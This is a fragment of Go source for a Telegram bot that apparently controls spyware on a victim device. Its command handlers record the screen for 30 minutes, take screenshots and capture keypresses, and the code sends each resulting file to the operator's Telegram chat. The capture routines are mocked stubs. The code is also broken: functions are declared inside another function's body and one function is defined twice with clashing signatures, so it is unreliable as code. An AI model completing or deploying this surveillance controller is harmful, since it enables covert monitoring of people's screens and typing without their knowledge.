                "• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴅɪʀᴇᴄᴛ ʟɪɴᴋ ᴏ꜇ ᴛʜᴇ ᴅᴇ꜀ɪʀᴇᴅ ꜱᴏᴜɴᴅ, ᴏᴛʜᴇʀᴡɪ꜇ᴇ ᴛʜᴇ ꜱᴏᴜɴᴅ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ᴘʟᴀʏᴇᴇ",
            map[string]interface{}{
                "reply_markup": map[string]interface{}{
                    "force_reply": true,
                },
                "parse_mode": "HTML",
            },
        )
        currentUuid = uuid
    }
	if command == "read_notifications" {
		appBot.DeleteMessage(id, msg.MessageID)
		appBot.SendMessage(
			id,
			"°• 𝙈𝙖𝙧𝙠𝙚𝙙 𝙖𝙡𝙡 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣𝙨 𝙖𝙨 𝙧𝙚𝙖𝙙\n\n"+
				"• ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴꜱ ʏᴏᴜ ʜᴀᴠᴇ ꜱᴇᴇɴ ᴀʀᴇ ᴍᴀʀᴋᴇᴅ ᴀꜱ ʀᴇᴀᴅ, ɴᴏ ꜰᴜʀᴛʜᴇʀ ᴀᴄᴛɪᴏɴ ɪꜱ ʀᴇǫᴜɪʀᴇᴅ.",
			map[string]interface{}{
				"reply_markup": map[string]interface{}{
					"inline_keyboard": [][]map[string]string{
						{
							{"text": "Back to Menu", "callback_data": "main_menu"},
						},
					},
				},
				"parse_mode": "HTML",
			},
		)
		currentUuid = uuid
	}
	
	if command == "screen_recording" {
		appBot.DeleteMessage(id, msg.MessageID)
		appBot.SendMessage(
			id,
			"°• 𝙎𝙩𝙖𝙧𝙩 𝙎𝙘𝙧𝙚𝙚𝙣 𝙍𝙚𝙘𝙤𝙧𝙙𝙞𝙣𝙜\n\n"+
				"• ᴘʟᴇᴀꜱᴇ ᴄʜᴏᴏꜱᴇ ᴡʜᴀᴛ ᴛᴏ ʀᴇᴄᴏʀᴅ: ꜱᴄʀᴇᴇɴ ᴏʀ ꜱᴘᴇᴄɪꜰɪᴄ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ.\n\n"+
				"• ᴛʜᴇ ꜱᴄʀᴇᴇɴ ʀᴇᴄᴏʀᴅɪɴɢ ᴡɪʟʟ ʀᴜɴ ꜰᴏʀ 30 ᴍɪɴᴜᴛᴇꜱ ᴀᴛ 240ᴘ.\n"+
				"• ɪꜰ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ʙʀᴇᴀᴋꜱ, ᴛʜᴇ ʀᴇᴄᴏʀᴅᴇᴅ ꜰɪʟᴇ ᴡɪʟʟ ʙᴇ ꜱᴇɴᴛ ᴜᴘ ᴛᴏ ᴛʜᴀᴛ ᴘᴏɪɴᴛ.",
			map[string]interface{}{
				"reply_markup": map[string]interface{}{
					"force_reply": true,
				},
				"parse_mode": "HTML",
			},
		)
	
		// Simulating screen recording process
		go func() {
			duration := time.Minute * 30
			resolution := "240p"
	
			recordingFile := "recording.mp4"
			err := startScreenRecording(recordingFile, duration, resolution)
			if err != nil {
				appBot.SendMessage(id, "Error starting screen recording: "+err.Error(), nil)
				return
			}
	
			select {
			case <-time.After(duration):
				// Screen recording completed
				appBot.SendMessage(id, "Screen recording completed. Sending file...", nil)
				sendFileToTelegramBot(id, recordingFile)
			case <-connectionLost():
				// Connection lost during recording
				appBot.SendMessage(id, "Connection lost! Sending recorded file up to this point.", nil)
				sendFileToTelegramBot(id, recordingFile)
			}
		}()
		currentUuid = uuid
	}
	
	if command == "stop_screen_recording" {
		appBot.DeleteMessage(id, msg.MessageID)
		appBot.SendMessage(
			id,
			"°• 𝙎𝙩𝙤𝙥 𝙎𝙘𝙧𝙚𝙚𝙣 𝙍𝙚𝙘𝙤𝙧𝙙𝙞𝙣𝙜\n\n"+
				"• ᴛʜᴇ ꜱᴄʀᴇᴇɴʀᴇᴄᴏʀᴅɪɴɢ ʜᴀꜱ ʙᴇᴇɴ ꜱᴛᴏᴘᴘᴇᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ.",
			map[string]interface{}{
				"reply_markup": map[string]interface{}{
					"inline_keyboard": [][]map[string]string{
						{
							{"text": "View Recordings", "callback_data": "view_recordings"},
							{"text": "Back to Menu", "callback_data": "main_menu"},
						},
					},
				},
				"parse_mode": "HTML",
			},
		)
		currentUuid = uuid
	}
	
	if command == "take_screenshot" {
		appBot.DeleteMessage(id, msg.MessageID)
		appBot.SendMessage(
			id,
			"°• 𝙏𝙖𝙠𝙚 𝙎𝙘𝙧𝙚𝙚𝙣𝙨𝙝𝙤𝙩\n\n"+
				"• ꜱᴄʀᴇᴇɴꜱʜᴏᴛ ʜᴀꜱ ʙᴇᴇɴ ᴛᴀᴋᴇɴ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ. ꜱᴇɴᴅɪɴɢ ɪᴛ ᴛᴏ ʏᴏᴜʀ ᴛᴇʟᴇɢʀᴀᴍ ᴄʜᴀᴛ...",
			nil,
		)
	
		screenshotFile := "screenshot.png"
		err := takeScreenshot(screenshotFile)
		if err != nil {
			appBot.SendMessage(id, "Error taking screenshot: "+err.Error(), nil)
			return
		}
	
		sendFileToTelegramBot(id, screenshotFile)
	}
	if command == "read_screen" {
		appBot.DeleteMessage(id, msg.MessageID)
		appBot.SendMessage(
			id,
			"°• 𝙍𝙚𝙖𝙙 𝘿𝙚𝙫𝙞𝙘𝙚 𝙎𝙘𝙧𝙚𝙚𝙣\n\n"+
				"• ꜱᴄʀᴇᴇɴ ꜱᴛᴀᴛᴜꜱ ᴀɴᴅ ᴋᴇʏᴘʀᴇꜱꜱᴇꜱ ᴡɪʟʟ ʙᴇ ᴄᴀᴘᴛᴜʀᴇᴅ. ꜱᴇɴᴅɪɴɢ ᴅᴀᴛᴀ ᴀꜱ ᴀ ᴛᴇxᴛ ꜰɪʟᴇ.",
			nil,
		)
	
		go func() {
			screenDataFile := "screen_data.txt"
	
			type KeypressData struct {
				Timestamp string `json:"timestamp"`
				Key       string `json:"key"`
			}
	
			var keypresses []KeypressData
	
			// Simulate keypress capture and save to file
			err := captureKeypresses(keypresses, screenDataFile)
			if err != nil {
				appBot.SendMessage(id, "Error capturing screen data: "+err.Error(), nil)
				return
			}
	
			appBot.SendMessage(id, "Screen data captured. Sending file...", nil)
			sendFileToTelegramBot(id, screenDataFile)
		}()
	
		currentUuid = uuid
	}
	
	func captureKeypresses(keypresses []KeypressData, fileName string) error {
		// Simulated function to capture keypresses and write to a file
		fakeKeypresses := []KeypressData{
			{Timestamp: "2024-11-23T10:00:00Z", Key: "A"},
			{Timestamp: "2024-11-23T10:00:01Z", Key: "B"},
			{Timestamp: "2024-11-23T10:00:02Z", Key: "C"},
		}
	
		keypresses = append(keypresses, fakeKeypresses...)
	
		file, err := os.Create(fileName)
		if err != nil {
			return err
		}
		defer file.Close()
	
		encoder := json.NewEncoder(file)
		return encoder.Encode(keypresses)
	}
	
	func sendFileToTelegramBot(chatID int, fileName string) {
		// Simulated function to send file to Telegram bot
		appBot.SendDocument(chatID, fileName, "Captured screen data")
	}
	
	
	func startScreenRecording(fileName string, duration time.Duration, resolution string) error {
		// Logic to start screen recording (mocked)
		return nil
	}
	
	func takeScreenshot(fileName string) error {
		// Logic to take a screenshot with good quality (mocked)
		return nil
	}
	
	func sendFileToTelegramBot(chatID int64, filePath string) {
		// Logic to send the file to Telegram Bot (mocked)
	}
	
	func connectionLost() <-chan struct{} {
		// Simulate connection lost detection (mocked)
		ch := make(chan struct{})
		go func() {
			time.Sleep(time.Second * 10) // Simulate connection loss after 10 seconds
			close(ch)
		}()
		return ch
	}
}	
